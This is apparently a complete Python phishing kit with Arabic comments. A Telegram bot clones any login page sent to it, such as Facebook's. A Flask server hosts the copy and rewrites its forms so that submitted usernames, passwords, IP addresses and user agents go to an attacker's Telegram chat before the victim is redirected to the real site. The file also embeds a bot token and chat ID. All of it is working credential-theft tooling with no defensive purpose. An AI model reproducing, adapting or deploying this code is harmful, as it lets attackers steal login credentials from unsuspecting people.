import os, re, uuid, logging, tempfile, asyncio
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, abort, redirect
from threading import Thread
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ========== القيم المدمجة ==========
BOT_TOKEN = "8511885419:AAHi0yNNaA1IVDtulFZBokSb9l_KbXaQe38"
ADMIN_CHAT = "6829017835"
RENDER_URL = "https://goldengeneral.onrender.com"
# ====================================

TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)
phish_pages = {}

@app.route('/phish/<page_id>')
def serve_phish(page_id):
    page = phish_pages.get(page_id)
    if not page:
        abort(404)
    html, original_url, _ = page
    return html.replace("{form_action}", f"/submit/{page_id}")

@app.route('/submit/<page_id>', methods=['POST'])
def submit_phish(page_id):
    data = request.form.to_dict()
    message = f"🎣 صيد جديد من {page_id}:\n"
    for k, v in data.items():
        message += f"{k}: {v}\n"
    message += f"\nIP: {request.remote_addr}\nAgent: {request.headers.get('User-Agent')}"
    requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": ADMIN_CHAT, "text": message})
    ori = phish_pages[page_id][1]
    return redirect(ori, code=302)

@app.route('/')
def health():
    return "GoldenGeneral Phish only"

# --- معالج أمر /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🥇 أرسل رابط أي صفحة تسجيل دخول لاستنساخها فورًا.\nمثال: https://facebook.com/login")

# --- معالج الروابط: يستقبل أي رابط ويفعله ---
async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith("http"):
        url = "https://" + url
    msg = await update.message.reply_text("🔧 جاري استنساخ الموقع...")
    try:
        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        page_id = str(uuid.uuid4())[:8]
        for form in soup.find_all('form'):
            form['action'] = f"/submit/{page_id}"
        modified_html = str(soup)
        phish_pages[page_id] = (modified_html, url, 'generic')
        await msg.edit_text(f"🎣 تم الاستنساخ: {RENDER_URL}/phish/{page_id}")
    except Exception as e:
        await msg.edit_text(f"❌ فشل: {e}")

# --- تشغيل البوت ---
def start_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    # أي نص آخر (غير أوامر) يعامل كرابط
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    app_bot.run_polling(close_loop=False)
    loop.close()

if __name__ == '__main__':
    Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)